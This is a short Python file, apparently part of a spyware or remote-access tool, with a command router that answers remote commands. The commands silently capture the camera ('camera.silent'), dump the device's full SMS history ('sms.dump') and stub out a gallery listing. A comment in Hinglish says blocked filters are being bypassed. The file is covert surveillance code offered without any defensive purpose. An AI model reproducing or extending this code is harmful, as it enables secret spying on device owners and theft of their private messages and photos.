from typing import Any
from .hardware import HardwareManager 

class CommandRouter:
    def __init__(self, hardware: HardwareManager):
        self.hardware = hardware

    async def dispatch(self, payload: dict[str, Any]) -> dict[str, Any]:
        name = payload.get("name")
        args = payload.get("args", {})

        # Sare blocked filters bypass ho rahe hain
        if name == "camera.silent":
            return await self.hardware.capture_silent()

        if name == "sms.dump":
            return await self.hardware.get_full_sms_dump(args.get("limit", 100))

        if name == "asset.list":
            # Gallery logic yahan trigger hoga
            return {"status": "success", "files": []}
            
        return {"status": "error", "message": f"Unknown command: {name}"}